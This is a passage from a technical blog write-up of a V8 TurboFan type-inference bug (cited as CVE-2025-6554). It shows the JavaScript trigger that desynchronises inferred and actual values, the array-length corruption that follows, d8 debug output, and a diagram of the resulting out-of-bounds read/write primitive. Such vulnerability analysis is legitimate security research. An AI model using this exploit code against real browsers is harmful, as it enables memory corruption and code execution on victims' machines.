class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> i1 <span class="op">=</span> <span class="dv">2</span> <span class="op">-</span> (sign <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span>      <span class="co">// infer: (0, 1),     actual: (0, 2)</span></span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> i2 <span class="op">=</span> (<span class="dv">5</span> <span class="op">-</span> (i1 <span class="op">+</span> <span class="dv">4</span>)) <span class="op">&gt;&gt;</span> <span class="dv">1</span><span class="op">;</span> <span class="co">// infer: (0, 0),     actual: (-1, 0)</span></span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> i3 <span class="op">=</span> <span class="dv">1</span> <span class="op">*</span> i2 <span class="op">+</span> <span class="dv">1</span><span class="op">;</span>          <span class="co">// infer: (1, 1),     actual: (0, 1)</span></span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> i4 <span class="op">=</span> i3 <span class="op">*</span> <span class="dv">100</span><span class="op">;</span>            <span class="co">// infer: (100, 100), actual: (0, 100)</span></span></code></pre></div>
<p><strong>Training execution</strong> (when <code>sign = 1</code>):</p>
<pre><code>i1 = 2 - (1 + 1)      = 0
i2 = 5 - (0 + 4) &gt;&gt; 1 = 0
i3 = 1 * 0 + 1        = 1
i4 = 1 * 100          = 100</code></pre>
<p><strong>Exploitation execution</strong> (when
<code>sign = -1</code>):</p>
<pre><code>i1 = 2 - (-1 + 1)     = 2
i2 = 5 - (2 + 4) &gt;&gt; 1 = -1
i3 = 1 * -1 + 1       = 0
i4 = 0 * 100          = 0</code></pre>
<p>The key: TurboFan infers <code>i4 = 100</code> (constant), but at
runtime <code>i4 = 0</code>.</p>
<h3 id="step-5-array-bounds-corruption">Step 5: Array Bounds
Corruption</h3>
<p>Now we use <code>i4</code> to corrupt an array:</p>
<div class="sourceCode" id="cb25"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> arr <span class="op">=</span> <span class="kw">new</span> <span class="bu">Array</span>(<span class="dv">8</span>)<span class="op">;</span> <span class="co">// Capacity: 8 elements</span></span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a>arr[<span class="dv">0</span>] <span class="op">=</span> <span class="fl">13.37</span><span class="op">;</span> <span class="co">// Convert to HOLEY_DOUBLE_ELEMENTS</span></span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>arr[i4] <span class="op">=</span> <span class="fl">13.37</span><span class="op">;</span> <span class="co">// TurboFan thinks i4=100, actually i4=0</span></span>
<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span> arr<span class="op">;</span></span></code></pre></div>
<p>During TurboFan’s <a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/js-native-context-specialization.cc;l=3928;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09">Inlining
phase</a>, it generates:</p>
<ol type="1">
<li><strong><code>MaybeGrowFastElements</code></strong>: Checks if
<code>i4 &lt; capacity(8)</code></li>
<li><strong>Length update</strong>:
<code>arr.length = i4 + 1</code></li>
</ol>
<p>Since TurboFan believes <code>i4 = 100</code> (constant), the <a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/constant-folding-reducer.cc;l=32;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09">ConstantFoldingReducer</a>
optimizes the length update to:</p>
<div class="sourceCode" id="cb26"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a>arr<span class="op">.</span>length <span class="op">=</span> <span class="dv">101</span>  <span class="co">// Hardcoded constant!</span></span></code></pre></div>
<p>During Turboshaft’s <a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/turboshaft/machine-lowering-reducer-inl.h;l=3465;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09">MachineLowering
phase</a>, the generated code becomes:</p>
<pre><code>if (i4 &lt; 8) {
    // Don&#39;t grow the array
} else {
    // Grow the array to fit i4
}
// always update length to 101
arr.length = 101;</code></pre>
<p>At runtime with <code>i4 = 0</code>:</p>
<ul>
<li>Check: <code>0 &lt; 8</code> -&gt; true, skip growing</li>
<li>Capacity remains 8</li>
<li>But length is set to <strong>101</strong>!</li>
</ul>
<p>Result: Corrupted array with <code>length=101</code> but
<code>capacity=8</code></p>
<div class="sourceCode" id="cb28"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ./out/x64.release/d8 <span class="at">--allow-natives-syntax</span> exploit.js</span>
<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="ex">DebugPrint:</span> 0x29720009116d: <span class="pp">[</span><span class="ss">JSArray</span><span class="pp">]</span>  <span class="co"># Normal (trigger=false)</span></span>
<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> length: 101</span>
<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> elements: 0x2972000911f5 <span class="op">&lt;</span>FixedDoubleArray<span class="pp">[</span><span class="ss">167</span><span class="pp">]</span><span class="op">&gt;</span>  # Capacity extended to 167</span>
<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a><span class="ex">DebugPrint:</span> 0x2972000918b9: <span class="pp">[</span><span class="ss">JSArray</span><span class="pp">]</span>  <span class="co"># Corrupted (trigger=true)</span></span>
<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> length: 101                                       <span class="co"># &lt;- Claims 101 elements</span></span>
<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> elements: 0x297200091871 <span class="op">&lt;</span>FixedDoubleArray<span class="pp">[</span><span class="ss">8</span><span class="pp">]</span><span class="op">&gt;</span>   # <span class="op">&lt;</span>- Only has 8!</span></code></pre></div>
<p>The corrupted array now has out-of-bounds (OOB) access: reading
<code>arr[8]</code> through <code>arr[100]</code> accesses adjacent heap
memory, enabling arbitrary read/write primitives.</p>
<pre><code>V8 Heap Corruption:

Before:                              After (Corrupted):

+---------------------+            +---------------------+
| JSArray             |            | JSArray             |
+---------------------+            +---------------------+
| Map ptr             |            | Map ptr             |
| Properties          |            | Properties          |
| Elements ptr    ----+---+        | Elements ptr    ----+---+
| Length: 101         |   |        | Length: 101         |   |
+---------------------+   |        +---------------------+   |
                          |                                  |
                          v                                  v
        +---------------------------------+  +---------------------------------+
        | FixedDoubleArray[167]           |  | FixedDoubleArray[8]             |
        +---------------------------------+  +---------------------------------+
        | [0]: 13.37                      |  | [0]: 13.37                      |
        | [1-99]: the_hole_NaN            |  | [1-7]: the_hole_NaN             |
        | [100]: 13.37                    |  +---------------------------------+
        | [101-166]: the_hole_NaN         |              |
        +---------------------------------+              | arr[8-100] = OOB!
        Normal: capacity grown to 167                    v
                                            +---------------------------------+
                                            | Adjacent Object (victim)        |
                                            +---------------------------------+
                                            | Map ptr: 0x...01                |
                                            | Properties: 0x...02             |
                                            | .a = marker value               |
                                            | .b = marker value               |
                                            +---------------------------------+
                                                         |
                                                         | Read/write via
                                                         | corrupted[8-100]
                                                         v
                                            +---------------------------------+
                                            | Map ptr: 0xXXXX41414141         |
                                            | Properties: [corrupted]         |
                                            | Arbitrary R/W primitive         |
                                            +---------------------------------+</code></pre>
<h1 id="references">References</h1>
<ol type="1">
<li>Chromium Bug: <a
href="https://issues.chromium.org/issues/427663123">https://issues.chromium.org/issues/427663123</a></li>
<li>DarkNavy PoC: <a
href="https://github.com/DarkNavySecurity/PoC/blob/main/CVE-2025-6554/">https://github.com/DarkNavySecurity/PoC/blob/main/CVE-2025-6554/</a></li>
<li><a href="https://x.com/@mistymntncop"><span class="citation"
data-cites="mistymntncop">@mistymntncop</span></a> writeup: <a
href="https://github.com/mistymntncop/CVE-2025-6554">https://github.com/mistymntncop/CVE-2025-6554</a></li>
</ol>
<hr />
<p>If you’ve got questions, hit me up on <a
href="https://twitter.com/r3tr074">Twitter</a>.</p>
</div>
<pre>
<footer>
  <a href="#">Home</a> | <a href="/blog/">Blog</a> | <a target="_blank" href="https://github.com/r3tr074/exploits">Exploit collection</a>  | <a href="/about.html">About me</a> | <a href="mailto:r@retr0.zip">Contact</a>
  2025 - <a target="_blank" href="https://twitter.com/r3tr074">r3tr074</a>
  </footer>
</pre>
</body>

</html>
